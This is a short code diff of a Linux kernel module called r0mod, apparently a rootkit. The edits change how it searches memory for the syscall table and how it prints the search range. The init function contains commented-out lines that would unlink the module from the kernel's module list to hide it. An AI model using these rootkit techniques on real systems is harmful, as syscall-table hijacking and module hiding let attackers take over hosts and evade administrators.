@@ -9,8 +9,8 @@
 
 #include <r0mod/global.h>
 
-#define SEARCH_START    PAGE_OFFSET
-#define SEARCH_END      PAGE_OFFSET + 0xffffffff
+#define SEARCH_START    0xc0000000
+#define SEARCH_END      SEARCH_START + 0xffffffff
 
 unsigned long *syscall_table;
 
@@ -80,8 +80,8 @@ static int __init r0mod_init(void)
     //list_del_init(&__this_module.list);
     //kobject_del(&THIS_MODULE->mkobj.kobj);
 
-    printk("Search Start: %lx\n", SEARCH_START);
-    printk("Search End:   %lx\n", SEARCH_END);
+    printk("Search Start: %x\n", SEARCH_START);
+    printk("Search End:   %x\n", SEARCH_END);
 
     //syscall_table = (void *)find_sys_call_table();
     if((syscall_table = (void *)find_sys_call_table()) == NULL)
